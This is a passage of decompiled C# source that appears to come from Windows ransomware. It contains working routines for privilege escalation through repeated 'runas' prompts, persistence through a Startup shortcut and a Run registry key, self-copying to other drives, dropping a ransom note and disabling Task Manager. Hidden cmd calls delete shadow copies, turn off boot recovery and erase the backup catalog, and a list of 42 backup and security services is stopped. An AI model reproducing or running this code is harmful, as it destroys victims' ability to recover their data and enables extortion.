		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
